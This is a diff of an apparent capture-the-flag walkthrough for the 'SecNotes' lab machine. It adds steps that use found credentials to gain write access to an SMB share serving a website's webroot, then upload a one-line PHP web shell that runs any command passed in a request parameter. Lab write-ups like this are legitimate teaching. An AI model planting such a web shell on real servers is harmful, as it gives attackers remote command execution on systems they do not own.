@@ -46,7 +46,16 @@ On my listener I get a connection and I can now login with `tyler:password` and 
 
 <img src="images/pwreset.png">
 
-We see a note for `new site`. This is likely referring to the site on port 8808. It appears to contains credentials for the share `\\secnotes.htb\new-site`. I'll check this with `smbclient`
+We see a note for `new site`. This is likely referring to the site on port 8808. It appears to contains credentials for the share `\\secnotes.htb\new-site`. I'll check access with `smbmap`
 
+<img src="images/new-site.png">
 
+We have write access over the `new-site` share. Visiting the share with `smbclient` shows we're in the webroot of the site on port 8808.
 
+<img src="images/iis.png">
+
+I'll create a php script containing
+```
+<?php system($_REQUEST['cmd']); ?>
+```
+and upload it to the share.
